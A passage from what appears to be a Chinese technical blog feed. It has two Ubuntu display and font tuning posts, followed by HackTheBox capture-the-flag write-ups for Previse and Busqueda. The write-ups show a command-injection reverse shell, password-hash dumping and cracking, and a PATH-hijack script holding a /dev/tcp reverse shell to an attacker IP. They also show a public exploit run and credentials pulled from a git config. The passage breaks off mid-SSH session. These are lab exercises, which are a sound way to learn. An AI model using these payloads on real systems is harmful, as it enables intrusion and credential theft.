<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#</span>
<span class="token comment"># See /usr/share/gdm/gdm.schemas for a list of available options.</span>

<span class="token punctuation">[</span>daemon<span class="token punctuation">]</span>
<span class="token comment"># Uncomment the line below to force the login screen to use Xorg</span>
<span class="token assign-left variable">WaylandEnable</span><span class="token operator">=</span>false

<span class="token comment"># Enabling automatic login</span>
<span class="token comment">#  AutomaticLoginEnable = true</span>
<span class="token comment">#  AutomaticLogin = user1</span>

<span class="token comment"># Enabling timed login</span>
<span class="token comment">#  TimedLoginEnable = true</span>
<span class="token comment">#  TimedLogin = user1</span>
<span class="token comment">#  TimedLoginDelay = 10</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>效果</p>
<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%962/image-20250416233209537.png" class="">

<h4 id="2-使用如下命令（没试过，不知道是否有效）"><a href="#2-使用如下命令（没试过，不知道是否有效）" class="headerlink" title="2. 使用如下命令（没试过，不知道是否有效）"></a>2. 使用如下命令（没试过，不知道是否有效）</h4><p>可以开启 Wayland 会话、X11 会话的分数倍缩放，并且在 Wayland 下使用分数倍缩放的时候，应用程序不模糊</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gsettings <span class="token builtin class-name">set</span> org.gnome.mutter experimental-features <span class="token string">"['scale-monitor-framebuffer', 'x11-randr-fractional-scaling', 'xwayland-native-scaling']"</span></code></pre>
]]></content>
      <categories>
        <category>OS优化</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 24.04 中文字体渲染</title>
    <url>/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/image-20250416104913620.png" class="">

<span id="more"></span>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>近期入手了一台2.8k屏幕的新本，安装了ubuntu24.04 在系统语言默认为英文时，中文字体看着非常别扭，有些字体甚至出现半格情况，比如<code>复</code> ，查了一些资料原因是字体显示优先级的问题，解决方案修改字体优先级即可</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>进入<code>/usr/share/fontconfig/conf.avail</code> 目录，打开<code>64-language-selector-cjk-prefer.conf</code> 文件可以看到CJK (是中文、日文和韩文的字母缩写) 顺序日式中文优先级高于简体中文。直接调换位置将简体中文放到最先。</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;
&lt;fontconfig&gt;
        &lt;alias&gt;
                &lt;family&gt;sans-serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Serif CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK TC&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;monospace&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans Mono CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
&lt;&#x2F;fontconfig&gt;</code></pre>

<p>修改后</p>
<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE fontconfig SYSTEM &quot;fonts.dtd&quot;&gt;
&lt;fontconfig&gt;
        &lt;alias&gt;
                &lt;family&gt;sans-serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;serif&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Serif CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Serif CJK TC&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
        &lt;alias&gt;
                &lt;family&gt;monospace&lt;&#x2F;family&gt;
                &lt;prefer&gt;
                        &lt;family&gt;Noto Sans Mono CJK SC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK KR&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK JP&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK TC&lt;&#x2F;family&gt;
                        &lt;family&gt;Noto Sans Mono CJK HK&lt;&#x2F;family&gt;
                &lt;&#x2F;prefer&gt;
        &lt;&#x2F;alias&gt;
&lt;&#x2F;fontconfig&gt;</code></pre>

<p>效果</p>
<img src="/OS%E4%BC%98%E5%8C%96/os/ubuntu%E4%BC%98%E5%8C%96/image-20250416133422397.png" class="" title="image-20250416133422397">
]]></content>
      <categories>
        <category>OS优化</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Previse</title>
    <url>/Hackthebox/htb/htb-previse/</url>
    <content><![CDATA[<style>.xckmqbxvikdq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-previse/e3c542ada4b134e29e534e3081ef9650.png" class="xckmqbxvikdq">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.104 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-04-04 <span class="token number">14</span>:00 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.104
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">53</span>:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">33</span>:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span> http-title: Previse Login
<span class="token operator">|</span>_Requested resource was login.php
<span class="token operator">|</span>_http-server-header: Apache/2.4.29 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">81.53</span> seconds</code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问80端口找到一个登录页面</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152518515.png" class="" title="登录页面">

<p>使用burp 抓包查看站点目录，找到一个accounts.php</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152429829.png" class="" title="burp">

<p>访问这个accounts.php，发现跳转不过去，可以尝试修改响应包 <code>Location：login.php</code> ，之后跳转到 accounts.php </p>
<img src="/Hackthebox/htb/htb-previse/image-20250404152719306.png" class="" title="burp">

<img src="/Hackthebox/htb/htb-previse/image-20250404141506785.png" class="" title="add new account">

<p>添加一个新账号，然后登录可以找到站点备份的压缩包</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142341145.png" class="" title="登录">

<p>下载并解压在config.php中可以找到mysql的用户名和密码</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142515834.png" class="" title="压缩包">

<img src="/Hackthebox/htb/htb-previse/image-20250404142709658.png" class="" title="数据库配置">

<p>分析其他php文件，在logs.php 中exec方法中引用了POST全局变量</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404142630382.png" class="" title="logs.php">

<p>根据格式直接构造反弹shell，最好使用url 编码</p>
<img src="/Hackthebox/htb/htb-previse/image-20250404143853371.png" class="" title="反弹shell">

<p>成功反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9001</span>                                     
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">35844</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@previse:/var/www/html$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先生成交互式shell，方便操作mysql，可以在数据库中查询到两条密码hash</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
script &#x2F;dev&#x2F;null -c &#x2F;bin&#x2F;bash
Script started, file is &#x2F;dev&#x2F;null
www-data@previse:&#x2F;var&#x2F;www&#x2F;html$ mysql -u root -p 
mysql -u root -p 
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and&#x2F;or its affiliates.

Oracle is a registered trademark of Oracle Corporation and&#x2F;or its
affiliates. Other names may be trademarks of their respective
owners.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

mysql&gt; show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql&gt; use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables; 
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql&gt; select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | admin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2025-04-04 05:56:26 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)</code></pre>

<p>使用John 破解hash </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ john <span class="token number">1</span>.hash <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>md5crypt-long
Using default input encoding: UTF-8
Loaded <span class="token number">2</span> password hashes with no different salts <span class="token punctuation">(</span>md5crypt-long, crypt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token variable">$1</span>$ <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span>MD5 <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Will run <span class="token number">8</span> OpenMP threads
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
admin            <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
ilovecody112235<span class="token operator">!</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
2g <span class="token number">0</span>:00:03:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-04-04 <span class="token number">14</span>:57<span class="token punctuation">)</span> <span class="token number">0</span>.01108g/s 41100p/s 41100c/s 41210C/s ilovecokey<span class="token punctuation">..</span>ilovecody<span class="token punctuation">..</span>
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre>

<p>使用数据库中的用户名和密码登录ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> m4lwhere@10.10.11.104
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.104 (10.10.11.104)'</span> can't be established.
ED25519 key fingerprint is SHA256:BF5tg2bhcRrrCuaeVQXikjd8BCPxgLsnnwHlaBo3dPs.
This key is not known by any other names.
Are you sure you want to <span class="token builtin class-name">continue</span> connecting <span class="token punctuation">(</span>yes/no/<span class="token punctuation">[</span>fingerprint<span class="token punctuation">]</span><span class="token punctuation">)</span>? <span class="token function">yes</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Last login: Fri Jun <span class="token number">18</span> 01:09:10 <span class="token number">2021</span> from <span class="token number">10.10</span>.10.5
m4lwhere@previse:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>m4lwhere<span class="token punctuation">)</span>
m4lwhere@previse:~$ <span class="token function">ls</span>
user.txt</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 查看是否有可以利用的配置，找到一个备份功能的脚本，查看脚本功能很简单就是使用gzip把日志文件归档。</p>
<p>gzip 并不是绝对路径，那可以使用path劫持来提权，进入&#x2F;tmp 创建一个shell脚本，命名为gzip，内容为</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> </code></pre>

<p>然后将&#x2F;tmp 添加到环境变量，最后给脚本添加执行权限，运行脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">m4lwhere@previse:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> m4lwhere: 
User m4lwhere may run the following commands on previse:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /opt/scripts/access_backup.sh

m4lwhere@previse:~$ <span class="token function">cat</span> /opt/scripts/access_backup.sh
<span class="token comment">#!/bin/bash</span>

<span class="token comment"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span class="token comment"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span class="token comment"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>

<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/log/apache2/access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_access.gz
<span class="token function">gzip</span> <span class="token parameter variable">-c</span> /var/www/file_access.log <span class="token operator">></span> /var/backups/<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">--date</span><span class="token operator">=</span><span class="token string">"yesterday"</span> +%Y%b%d<span class="token variable">)</span></span>_file_access.gz

m4lwhere@previse:/tmp$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span>
m4lwhere@previse:/tmp$ <span class="token function">nano</span> <span class="token function">gzip</span> 
m4lwhere@previse:/tmp<span class="token comment"># cat gzip</span>
<span class="token comment">#!/bin/bash</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span>/dev/tcp/10.10.16.39/9003 <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;1</span> 

m4lwhere@previse:/tmp$ <span class="token function">chmod</span> +x <span class="token function">gzip</span> 
m4lwhere@previse:/tmp$ <span class="token function">sudo</span> /opt/scripts/access_backup.sh </code></pre>

<p>成功反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.104<span class="token punctuation">]</span> <span class="token number">40558</span>
root@previse:/tmp<span class="token comment"># id      </span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>&#x2F;home&#x2F;m4lwhere&#x2F;user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Busqueda</title>
    <url>/Hackthebox/htb/htb-busqueda/</url>
    <content><![CDATA[<style>.gpbyvqawwnji{zoom:50%;}</style><img src="/Hackthebox/htb/htb-busqueda/a6942ab57b6a79f71240420442027334.png" class="gpbyvqawwnji">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.208  <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-23 <span class="token number">10</span>:49 CST
Warning: <span class="token number">10.10</span>.11.208 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.208
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.15s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65507</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">26</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.1 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">81</span>:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.52
<span class="token operator">|</span>_http-title: Did not follow redirect to http://searcher.htb/
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: Host: searcher.htb<span class="token punctuation">;</span> OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">127.64</span> seconds
</code></pre>

<p>访问80端口，自动跳转到<code>http://searcher.htb</code> ,添加本地域名解析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.208  searcher.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<p>抓包触发报错，在报错信息种可以找到版本号</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250323111357967.png" class="" title="burp">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过找到的版本号检索漏洞</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250324112347626.png" class="" title="exp">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ ./exploit.sh searcher.htb <span class="token number">10.10</span>.16.39 <span class="token number">9001</span>  
---<span class="token punctuation">[</span>Reverse Shell Exploit <span class="token keyword">for</span> Searchor <span class="token operator">&lt;=</span> <span class="token number">2.4</span>.2 <span class="token punctuation">(</span><span class="token number">2.4</span>.0<span class="token punctuation">)</span><span class="token punctuation">]</span>---
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Input target is searcher.htb
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Input attacker is <span class="token number">10.10</span>.16.39:9001
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the Reverse Shell<span class="token punctuation">..</span>. Press Ctrl+C after successful connection
</code></pre>

<p>成功反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">9001</span> 
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9001</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.208<span class="token punctuation">]</span> <span class="token number">47162</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1620</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
svc@busqueda:/var/www/app$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>svc<span class="token punctuation">)</span>
svc@busqueda:/var/www/app$ 
</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在&#x2F;var&#x2F;www&#x2F;app&#x2F;.git&#x2F;config中可以找到用户名密码和新的域名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">svc@busqueda:/var/www/app/.git$ <span class="token function">cat</span> config
<span class="token function">cat</span> config
<span class="token punctuation">[</span>core<span class="token punctuation">]</span>
	repositoryformatversion <span class="token operator">=</span> <span class="token number">0</span>
	filemode <span class="token operator">=</span> <span class="token boolean">true</span>
	bare <span class="token operator">=</span> <span class="token boolean">false</span>
	logallrefupdates <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token punctuation">[</span>remote <span class="token string">"origin"</span><span class="token punctuation">]</span>
	url <span class="token operator">=</span> http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch <span class="token operator">=</span> +refs/heads/*:refs/remotes/origin/*
<span class="token punctuation">[</span>branch <span class="token string">"main"</span><span class="token punctuation">]</span>
	remote <span class="token operator">=</span> origin
	merge <span class="token operator">=</span> refs/heads/main</code></pre>

<p>,添加本地域名解析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.11.208 gitea.searcher.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用获取到的密码和svc用户登录ssh，发现可以登录成功，查找sudo 配置，可以找到一个Python脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token function">ssh</span> svc@10.10.11.208
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.11.208 (10.10.11.208)'</span> can<span class="token string">'t be established.
